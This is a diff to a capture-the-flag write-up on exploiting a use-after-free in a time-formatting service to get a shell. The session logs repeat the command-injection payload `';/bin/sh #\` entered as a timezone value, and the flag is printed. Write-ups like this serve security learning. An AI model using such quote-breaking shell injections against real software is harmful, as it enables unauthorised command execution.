@@ -8,7 +8,8 @@ Can you you exploit it to get a shell? Running at unix.pwning.xxx:9999
 ```
 
 Writeup by: [mut3](https://github.com/mut3)
-Collaborator: [brianmwaters](https://github.com/brianmwaters)
+
+Collaborators: [brianmwaters](https://github.com/brianmwaters), [dillonb](https://github.com/dillonb)
 
 *Disclaimer :We came at this without a really organized process, so take not that most of these discoveries and progressions came with more over caffeinated fiddling and experimenting than this writeup lets on.*
 
@@ -131,7 +132,7 @@ Uh-oh, no shell, what went wrong? We went back into the disassembled program and
 
 There's input validation on time-format, but not on timezone. We found we could put anything we wanted into the timezone, but it wasn't included within the `system()` call, so what use was it? We weren't quite sure.
 
-We went back to messing around with the binary in DEBUG mode, testing ideas, bumbling around. After some frustrating head->wall grinding, I noticed the key we had missed before, "Hey wait, the f***ing thing **frees those pointers before exit**!" Eureka. When option 5 gets chosen, the memory `malloc()`'d by `strdup()` to store the TZ and format is freed before the user chooses wheter to exit the program or not. Brian had heard of double-free vulns and the undefined behavior they could cause. *(We now know it was just a use-after-free, but we freed twice.)* What a beautiful thing for somebody looking for a vulnerability to hear "undefined behavior," mmmm, tasty.
+We went back to messing around with the binary in DEBUG mode, testing ideas, bumbling around. After some frustrating head->wall grinding, I noticed the key we had missed before, "Hey wait, the f\*\*\*ing thing **frees those pointers before exit**!" Eureka. When option 5 gets chosen, the memory `malloc()`'d by `strdup()` to store the TZ and format is freed before the user chooses wheter to exit the program or not. Brian had heard of double-free vulns and the undefined behavior they could cause. *(We now know it was just a use-after-free, but we freed twice.)* What a beautiful thing for somebody looking for a vulnerability to hear "undefined behavior," mmmm, tasty.
 
 ## Exploiting
 
@@ -189,7 +190,8 @@ Format set.
 4) Print your time.
 5) Exit.
 > 3
-Time zone: ';/bin/sh #Time zone set.
+Time zone: ';/bin/sh #\
+Time zone set.
 1) Set a time format.
 2) Set a time.
 3) Set a time zone.
@@ -210,14 +212,16 @@ Are you sure you want to exit (y/N)?
 4) Print your time.
 5) Exit.
 > 3
-Time zone: ';/bin/sh #Time zone set.
+Time zone: ';/bin/sh #\
+Time zone set.
 1) Set a time format.
 2) Set a time.
 3) Set a time zone.
 4) Print your time.
 5) Exit.
 > 3
-Time zone: ';/bin/sh #Time zone set.
+Time zone: ';/bin/sh #\
+Time zone set.
 1) Set a time format.
 2) Set a time.
 3) Set a time zone.
@@ -237,5 +241,9 @@ exit
 ## Wrapup
 
 Flag: `PCTF{use_after_free_isnt_so_bad}`
+Notes:
+  * We now know we didn't need to double free, this is a use after free vulnerability
+  * Our payload `';/bin/sh #\` probably didn't need the `#\`, but we left it so that the second `'` wouldn't create problems
+  * We could have automated this, but it wasn't very time consuming to do manually, and this was our first time popping a shell, very exciting
 
-We now know we didn't need to double free and 
+Thanks to PPP for putting on PCTF.
